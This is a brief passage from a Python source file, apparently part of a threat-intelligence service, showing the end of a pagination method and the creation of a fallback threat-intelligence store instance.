        paginated = data[skip : skip + limit]
        return paginated, total


fallback_store = FallbackThreatIntelligenceStore()
